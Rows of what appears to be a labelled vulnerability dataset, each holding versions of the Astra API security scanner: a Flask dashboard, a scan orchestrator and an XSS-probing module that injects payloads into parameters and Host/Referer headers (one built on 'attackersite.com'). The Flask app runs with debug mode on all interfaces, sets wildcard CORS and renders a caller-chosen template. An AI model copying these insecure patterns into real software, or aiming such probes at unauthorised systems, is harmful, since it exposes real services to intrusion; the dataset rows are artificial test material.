            xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
            if xss_request_url.text.find(payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                xss_result = True

            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
            if xss_request_url.text.find(payload) != -1:
                impact = check_xss_impact()
                xss_result = True

            if xss_result is True:
                print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                dbupdate.insert_record(attack_result)
                return

def xss_get_uri(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        print ""param to test"",key
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        print xss_request.text
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        print ""all params"",vul_param


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)
        #xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
8,ee32dd65ddddc6dfefcf012def42eb1a3ae23e66,"API/api.py/n/nimport ast
import json
import sys
import hashlib
import time

sys.path.append('../')

from flask import Flask,render_template
from flask import Response,make_response
from flask import request
from flask import Flask
from astra import scan_single_api
from flask import jsonify
from pymongo import MongoClient
from utils.vulnerabilities import alerts
 
app = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')
 
# Mongo DB connection 
client = MongoClient('localhost',27017)
global db
db = client.apiscan


############################# Start scan API ######################################
def generate_hash():
    # Return md5 hash value of current timestmap 
    scanid = hashlib.md5(str(time.time())).hexdigest()
    return scanid

# Start the scan and returns the message
@app.route('/scan/', methods = ['POST'])
def start_scan():
    scanid = generate_hash()
    content = request.get_json()
    try:
        name = content['appname']
        url = content['url']
        headers = content['headers']
        body = content['body']
        method = content['method']
        api = ""Y""
        scan_status = scan_single_api(url, method, headers, body, api, scanid)
        if scan_status is True:
            # Success
            msg = {""status"" : scanid}
            try:
                db.scanids.insert({""scanid"" : scanid, ""name"" : name, ""url"" : url})
            except:
                print ""Failed to update DB""
        else:
            msg = {""status"" : ""Failed""}
    
    except:
        msg = {""status"" : ""Failed""} 
    
    return jsonify(msg)


#############################  Fetch ScanID API #########################################
@app.route('/scan/scanids/', methods=['GET'])
def fetch_scanids():
    scanids = []
    records = db.scanids.find({})
    if records:
        for data in records:
            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
                if data['scanid']:
                    if data['scanid'] not in scanids:
                        scanids.append({""scanid"" : data['scanid'], ""name"" : data['name'], ""url"" : data['url']}) 
            except:
                pass

        return jsonify(scanids)
############################# Alerts API ##########################################

# Returns vulnerbilities identified by tool 
def fetch_records(scanid):
    # Return alerts identified by the tool
    vul_list = []
    records = db.vulnerabilities.find({""scanid"":scanid})
    print ""Records are "",records
    if records:
        for data in records:  
            print ""Data is"",data
            if data['req_body'] == None:
                data['req_body'] = ""NA"" 

            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
            except:
                print ""Falied to parse""

            print ""Data"",data
            try:
                if data['id'] == ""NA"":
                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}
                    vul_list.append(all_data)

                if data['id']:
                    for vul in alerts:
                        if data['id'] == vul['id']:
                            all_data = {
                                        'url' : data['url'],
                                        'impact' : data['impact'],
                                        'name' : data['alert'],
                                        'req_headers' : data['req_headers'],
                                        'req_body' : data['req_body'],
                                        'res_headers' : data['res_headers'],
                                        'res_body' : data['res_body'],
                                        'Description' : vul['Description'],
                                        'remediation' : vul['remediation']
                                        }
                            vul_list.append(all_data)
                            break

            except:
                pass

        print vul_list
        return vul_list
        

@app.route('/alerts/<scanid>', methods=['GET'])
def return_alerts(scanid):
    print ""ScanID is "",scanid
    result = fetch_records(scanid)
    resp = jsonify(result)
    resp.headers[""Access-Control-Allow-Origin""] = ""*""
    return resp

#############################Dashboard#########################################

@app.route('/', defaults={'page': 'scan.html'})
@app.route('/<page>')
def view_dashboard(page):
    return render_template('{}'.format(page))

app.run(host='0.0.0.0', port= 8094,debug=True)
/n/n/nastra.py/n/nimport argparse
import base64
import json
import requests
import time
import ast
import utils.logger as logger
import utils.logs as logs
import urlparse


from core.zapscan import *
from core.parsers import *
from utils.logger import *
from core.login import APILogin
from utils.logger import logger
from utils.config import update_value,get_value,get_allvalues
from modules.cors import cors_main
from modules.auth import auth_check
from modules.rate_limit import rate_limit
from modules.csrf import csrf_check
from modules.jwt_attack import jwt_check
from modules.sqli import sqli_check
from modules.xss import xss_check
from core.zap_config import zap_start
from multiprocessing import Process


def parse_collection(collection_name,collection_type):
    if collection_type == 'Postman':
        parse_data.postman_parser(collection_name)
    elif collection_type == 'Swagger':
        print collection_type
    else:
        print ""[-]Failed to Parse collection""
        sys.exit(1)

def add_headers(headers):
    # This function deals with adding custom header and auth value .
    get_auth = get_value('config.property','login','auth_type')
    if get_auth == 'cookie':
        cookie = get_value('config.property','login','auth')
        cookie_dict = ast.literal_eval(cookie)
        cookie_header = {'Cookie': cookie_dict['cookie']}
        headers.update(cookie_header)
    try:
        custom_header = get_value('config.property','login','headers')
        custom_header = ast.literal_eval(custom_header)
        headers.update(custom_header)
    except:
        pass

    return headers

def generate_report():
    # Generating report once the scan is complete.
    result = api_scan.generate_report()
    if result is True:
        print ""%s[+]Report is generated successfully%s""% (api_logger.G, api_logger.W)
    else:
        print ""%s[-]Failed to generate a report%s""% (api_logger.R, api_logger.W)


def read_scan_policy():
    try:
        scan_policy = get_value('scan.property','scan-policy','attack')
        attack = ast.literal_eval(scan_policy)

    except Exception as e:
        print e
        print ""Failed to parse scan property file.""

    return attack

def modules_scan(url,method,headers,body,scanid=None):
    '''Scanning API using different engines '''
    attack = read_scan_policy()
    if attack is None:
        print ""Failed to start scan.""
        sys.exit(1)

    if attack['zap'] == ""Y"" or attack['zap'] == ""y"":
        api_scan = zap_scan()
        status = zap_start()
        if status is True:
            api_scan.start_scan(url,method,headers,body,scanid)
    
    # Custom modules scan      
    if attack['cors'] == 'Y' or attack['cors'] == 'y':
        cors_main(url,method,headers,body,scanid)
    if attack['Broken auth'] == 'Y' or attack['Broken auth'] == 'y':
        auth_check(url,method,headers,body,scanid)
    if attack['Rate limit'] == 'Y' or attack['Rate limit'] == 'y':
        rate_limit(url,method,headers,body,scanid)
    if attack['csrf'] == 'Y' or attack['csrf'] == 'y':
        csrf_check(url,method,headers,body,scanid)
    if attack['jwt'] == 'Y' or attack['jwt'] == 'y':
        jwt_check(url,method,headers,body,scanid)
    if attack['sqli'] == 'Y' or attack['sqli'] == 'y':
        sqli_check(url,method,headers,body,scanid)
    if attack['xss'] == 'Y' or attack['xss'] == 'y':
        xss_check(url,method,headers,body,scanid)

def validate_data(url,method):
    ''' Validate HTTP request data and return boolean value'''
    validate_url = urlparse.urlparse(url)
    http_method = ['GET','POST','DEL','OPTIONS','PUT']
    if method in http_method and bool(validate_url.scheme) is True:
        validate_result = True
    else:
        validate_result = False

    return validate_result

def scan_single_api(url, method, headers, body, api, scanid=None):
    ''' This function deals with scanning a single API. '''
    if headers is None or headers == '':
            headers = {'Content-Type' : 'application/json'}
    if type(headers) is not dict:
        headers = ast.literal_eval(headers)
    if method == '':
        method = 'GET'

    result = validate_data(url, method)
    if result is False:
        print ""[-]Invalid Arguments""
        return False

    p = Process(target=modules_scan,args=(url,method,headers,body,scanid),name='module-scan')
    p.start()
    if api == ""Y"":
        return True


def scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require):
    ''' Scan API through different engines ''' 
    if collection_type and collection_name is not None:
        parse_collection(collection_name,collection_type)
        if login_require is True:
            api_login.verify_login(parse_data.api_lst)
        msg = True
        for data in parse_data.api_lst:
            try:
                url = data['url']['raw']
            except:
                url = data['url']
            headers,method,body = data['headers'],data['method'],''
            if headers:
                try:
                    headhers = add_headers(headers)
                except:
                    pass

            if data['body'] != '':
                body = json.loads(base64.b64decode(data['body']))

            
            modules_scan(url,method,headers,body,attack)        

    else:
        print ""%s [-]Invalid Collection. Please recheck collection Type/Name %s"" %(api_logger.G, api_logger.W)
    #generate_report()

def get_arg(args=None):
        parser = argparse.ArgumentParser(description='REST API Security testing Framework')
        parser.add_argument('-c', '--collection_type',
                            help='Type of API collection',
                            default='Postman',choices=('Postman', 'Swagger'))
        parser.add_argument('-n', '--collection_name',
                            help='Type of API collection')
        parser.add_argument('-u', '--url',
                            help='URL of target API')
        parser.add_argument('-headers', '--headers',
                            help='Custom headers.Example: {""token"" : ""123""}')
        parser.add_argument('-method', '--method',
                            help='HTTP request method',
                            default='GET',choices=('GET', 'POST'))
        parser.add_argument('-b', '--body',
                            help='Request body of API')
        parser.add_argument('-l', '--loginurl',
                            help='URL of login API')
        parser.add_argument('-H', '--loginheaders',
                            help='Headers should be in a dictionary format. Example: {""accesstoken"" : ""axzvbqdadf""}')
        parser.add_argument('-d', '--logindata',
                            help='login data of API')
    

        results = parser.parse_args(args)
        if len(args) == 0:
            print ""%sAt least one argument is needed to procced.\nFor further information check help: %spython astra.py --help%s""% (api_logger.R, api_logger.G, api_logger.W)
            sys.exit(1)

        return (results.collection_type,
                results.collection_name,
                results.url,
                results.headers,
                results.method,
                results.body,
                results.loginurl,
                results.loginheaders,
                results.logindata,
                )

def main():
    collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata = get_arg(sys.argv[1:])
    if loginheaders is None:
            loginheaders = {'Content-Type' : 'application/json'}
    if collection_type and collection_name and loginurl and loginmethod and logindata:
        # Login data is given as an input. 
        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)
        login_require = False
    elif collection_type and collection_name and loginurl:
        # This will first find the given loginurl from collection and it will fetch auth token. 
        parse_collection(collection_name,collection_type)
        try:
            loginurl,lognheaders,loginmethod,logidata = api_login.parse_logindata(loginurl)
        except:
           print ""[-]%s Failed to detect login API from collection %s "" %(api_logger.R, api_logger.W)
           sys.exit(1)
        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)
        login_require = False
    elif loginurl and loginmethod:
        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)
        login_require = False
    elif collection_type and collection_name and headers:
        #Custom headers
        update_value('login','header',headers)
        login_require = False
    elif url and collection_name and headers:
        #Custom headers
        update_value('login','header',headers)
        login_require = False
    elif url:
        if headers is None:
            headers = {'Content-Type' : 'application/json'}
        if method is None:
            method = ""GET""
       
        login_require = False
    else:
        login_require = True

    if body:
        body = ast.literal_eval(body)

    # Configuring ZAP before starting a scan
    get_auth = get_value('config.property','login','auth_type')

    if collection_type and collection_name is not None:
        scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require) 
    else:
        scan_single_api(url, method, headers, body, ""False"")


if __name__ == '__main__':
    
    api_login = APILogin()
    parse_data = PostmanParser()
    api_logger = logger()
    api_logger.banner()
    main()
/n/n/nmodules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post.body)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
9,ee32dd65ddddc6dfefcf012def42eb1a3ae23e66,"/API/api.py/n/nimport ast
import json
import sys
import hashlib
import time

sys.path.append('../')

from flask import Flask,render_template
from flask import Response,make_response
from flask import request
from flask import Flask
from apiscan import scan_single_api
from flask import jsonify
from pymongo import MongoClient
from utils.vulnerabilities import alerts
 
app = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')
 
# Mongo DB connection 
client = MongoClient('localhost',27017)
global db
db = client.apiscan


############################# Start scan API ######################################
def generate_hash():
    # Return md5 hash value of current timestmap 
    scanid = hashlib.md5(str(time.time())).hexdigest()
    return scanid

# Start the scan and returns the message
@app.route('/scan/', methods = ['POST'])
def start_scan():
    scanid = generate_hash()
    content = request.get_json()
    try:
        name = content['appname']
        url = content['url']
        headers = content['headers']
        body = content['body']
        method = content['method']
        api = ""Y""
        scan_status = scan_single_api(url, method, headers, body, api, scanid)
        if scan_status is True:
            # Success
            msg = {""status"" : scanid}
            try:
                db.scanids.insert({""scanid"" : scanid, ""name"" : name, ""url"" : url})
            except:
                print ""Failed to update DB""
        else:
            msg = {""status"" : ""Failed""}
    
    except:
        msg = {""status"" : ""Failed""} 
    
    return jsonify(msg)


#############################  Fetch ScanID API #########################################
@app.route('/scan/scanids/', methods=['GET'])
def fetch_scanids():
    scanids = []
    records = db.scanids.find({})
    if records:
        for data in records:
            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
                if data['scanid']:
                    if data['scanid'] not in scanids:
                        scanids.append({""scanid"" : data['scanid'], ""name"" : data['name'], ""url"" : data['url']}) 
            except:
                pass

        return jsonify(scanids)
############################# Alerts API ##########################################

# Returns vulnerbilities identified by tool 
def fetch_records(scanid):
    # Return alerts identified by the tool
    vul_list = []
    records = db.vulnerabilities.find({""scanid"":scanid})
    print ""Records are "",records
    if records:
        for data in records:  
            print ""Data is"",data
            if data['req_body'] == None:
                data['req_body'] = ""NA"" 

            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
            except:
                print ""Falied to parse""

            print ""Data"",data
            try:
                if data['id'] == ""NA"":
                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}
                    vul_list.append(all_data)

                if data['id']:
                    for vul in alerts:
                        if data['id'] == vul['id']:
                            all_data = {
                                        'url' : data['url'],
                                        'impact' : data['impact'],
                                        'name' : data['alert'],
                                        'req_headers' : data['req_headers'],
                                        'req_body' : data['req_body'],
                                        'res_headers' : data['res_headers'],
                                        'res_body' : data['res_body'],
                                        'Description' : vul['Description'],
                                        'remediation' : vul['remediation']
                                        }
                            vul_list.append(all_data)
                            break

            except:
                pass

        print vul_list
        return vul_list
        

@app.route('/alerts/<scanid>', methods=['GET'])
def return_alerts(scanid):
    print ""ScanID is "",scanid
    result = fetch_records(scanid)
    resp = jsonify(result)
    resp.headers[""Access-Control-Allow-Origin""] = ""*""
    return resp

#############################Dashboard#########################################

@app.route('/', defaults={'page': 'scan.html'})
@app.route('/<page>')
def view_dashboard(page):
    return render_template('{}'.format(page))

app.run(host='0.0.0.0', port= 8094,debug=True)
/n/n/n",1
10,7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8,"API/api.py/n/nimport ast
import json
import sys
import hashlib
import time

sys.path.append('../')

from flask import Flask,render_template
from flask import Response,make_response
from flask import request
from flask import Flask
from astra import scan_single_api
from flask import jsonify
from pymongo import MongoClient
from utils.vulnerabilities import alerts
 
app = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')
 
# Mongo DB connection 
client = MongoClient('localhost',27017)
global db
db = client.apiscan


############################# Start scan API ######################################
def generate_hash():
    # Return md5 hash value of current timestmap 
    scanid = hashlib.md5(str(time.time())).hexdigest()
    return scanid

# Start the scan and returns the message
@app.route('/scan/', methods = ['POST'])
def start_scan():
    scanid = generate_hash()
    content = request.get_json()
    try:
        name = content['appname']
        url = content['url']
        headers = content['headers']
        body = content['body']
        method = content['method']
        api = ""Y""
        scan_status = scan_single_api(url, method, headers, body, api, scanid)
        if scan_status is True:
            # Success
            msg = {""status"" : scanid}
            try:
                db.scanids.insert({""scanid"" : scanid, ""name"" : name, ""url"" : url})
            except:
                print ""Failed to update DB""
        else:
            msg = {""status"" : ""Failed""}
    
    except:
        msg = {""status"" : ""Failed""} 
    
    return jsonify(msg)


#############################  Fetch ScanID API #########################################
@app.route('/scan/scanids/', methods=['GET'])
def fetch_scanids():
    scanids = []
    records = db.scanids.find({})
    if records:
        for data in records:
            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
                if data['scanid']:
                    if data['scanid'] not in scanids:
                        scanids.append({""scanid"" : data['scanid'], ""name"" : data['name'], ""url"" : data['url']}) 
            except:
                pass

        return jsonify(scanids)
############################# Alerts API ##########################################

# Returns vulnerbilities identified by tool 
def fetch_records(scanid):
    # Return alerts identified by the tool
    vul_list = []
    records = db.vulnerabilities.find({""scanid"":scanid})
    print ""Records are "",records
    if records:
        for data in records:  
            print ""Data is"",data
            if data['req_body'] == None:
                data['req_body'] = ""NA"" 

            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
            except:
                print ""Falied to parse""

            print ""Data"",data
            try:
                if data['id'] == ""NA"":
                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}
                    vul_list.append(all_data)

                if data['id']:
                    for vul in alerts:
                        if data['id'] == vul['id']:
                            all_data = {
                                        'url' : data['url'],
                                        'impact' : data['impact'],
                                        'name' : data['alert'],
                                        'req_headers' : data['req_headers'],
                                        'req_body' : data['req_body'],
                                        'res_headers' : data['res_headers'],
                                        'res_body' : data['res_body'],
                                        'Description' : vul['Description'],
                                        'remediation' : vul['remediation']
                                        }
                            vul_list.append(all_data)
                            break

            except:
                pass

        print vul_list
        return vul_list
        

@app.route('/alerts/<scanid>', methods=['GET'])
def return_alerts(scanid):
    print ""ScanID is "",scanid
    result = fetch_records(scanid)
    resp = jsonify(result)
    resp.headers[""Access-Control-Allow-Origin""] = ""*""
    return resp

#############################Dashboard#########################################

@app.route('/', defaults={'page': 'scan.html'})
@app.route('/<page>')
def view_dashboard(page):
    return render_template('{}'.format(page))

app.run(host='0.0.0.0', port= 8094,debug=True)
/n/n/nastra.py/n/nimport argparse
import base64
import json
import requests
import time
import ast
import utils.logger as logger
import utils.logs as logs
import urlparse


from core.zapscan import *
from core.parsers import *
from utils.logger import *
from core.login import APILogin
from utils.logger import logger
from utils.config import update_value,get_value,get_allvalues
from modules.cors import cors_main
from modules.auth import auth_check
from modules.rate_limit import rate_limit
from modules.csrf import csrf_check
from modules.jwt_attack import jwt_check
from modules.sqli import sqli_check
from modules.xss import xss_check
from core.zap_config import zap_start
from multiprocessing import Process


def parse_collection(collection_name,collection_type):
    if collection_type == 'Postman':
        parse_data.postman_parser(collection_name)
    elif collection_type == 'Swagger':
        print collection_type
    else:
        print ""[-]Failed to Parse collection""
        sys.exit(1)

def add_headers(headers):
    # This function deals with adding custom header and auth value .
    get_auth = get_value('config.property','login','auth_type')
    if get_auth == 'cookie':
        cookie = get_value('config.property','login','auth')
        cookie_dict = ast.literal_eval(cookie)
        cookie_header = {'Cookie': cookie_dict['cookie']}
        headers.update(cookie_header)
    try:
        custom_header = get_value('config.property','login','headers')
        custom_header = ast.literal_eval(custom_header)
        headers.update(custom_header)
    except:
        pass

    return headers

def generate_report():
    # Generating report once the scan is complete.
    result = api_scan.generate_report()
    if result is True:
        print ""%s[+]Report is generated successfully%s""% (api_logger.G, api_logger.W)
    else:
        print ""%s[-]Failed to generate a report%s""% (api_logger.R, api_logger.W)


def read_scan_policy():
    try:
        scan_policy = get_value('scan.property','scan-policy','attack')
        attack = ast.literal_eval(scan_policy)

    except Exception as e:
        print e
        print ""Failed to parse scan property file.""

    return attack

def modules_scan(url,method,headers,body,scanid=None):
    '''Scanning API using different engines '''
    attack = read_scan_policy()
    if attack is None:
        print ""Failed to start scan.""
        sys.exit(1)

    if attack['zap'] == ""Y"" or attack['zap'] == ""y"":
        api_scan = zap_scan()
        status = zap_start()
        if status is True:
            api_scan.start_scan(url,method,headers,body,scanid)
    
    # Custom modules scan      
    if attack['cors'] == 'Y' or attack['cors'] == 'y':
        cors_main(url,method,headers,body,scanid)
    if attack['Broken auth'] == 'Y' or attack['Broken auth'] == 'y':
        auth_check(url,method,headers,body,scanid)
    if attack['Rate limit'] == 'Y' or attack['Rate limit'] == 'y':
        rate_limit(url,method,headers,body,scanid)
    if attack['csrf'] == 'Y' or attack['csrf'] == 'y':
        csrf_check(url,method,headers,body,scanid)
    if attack['jwt'] == 'Y' or attack['jwt'] == 'y':
        jwt_check(url,method,headers,body,scanid)
    if attack['sqli'] == 'Y' or attack['sqli'] == 'y':
        sqli_check(url,method,headers,body,scanid)
    if attack['xss'] == 'Y' or attack['xss'] == 'y':
        xss_check(url,method,headers,body,scanid)

def validate_data(url,method):
    ''' Validate HTTP request data and return boolean value'''
    validate_url = urlparse.urlparse(url)
    http_method = ['GET','POST','DEL','OPTIONS','PUT']
    if method in http_method and bool(validate_url.scheme) is True:
        validate_result = True
    else:
        validate_result = False

    return validate_result

def scan_single_api(url, method, headers, body, api, scanid=None):
    ''' This function deals with scanning a single API. '''
    if headers is None or headers == '':
            headers = {'Content-Type' : 'application/json'}
    if type(headers) is not dict:
        headers = ast.literal_eval(headers)
    if method == '':
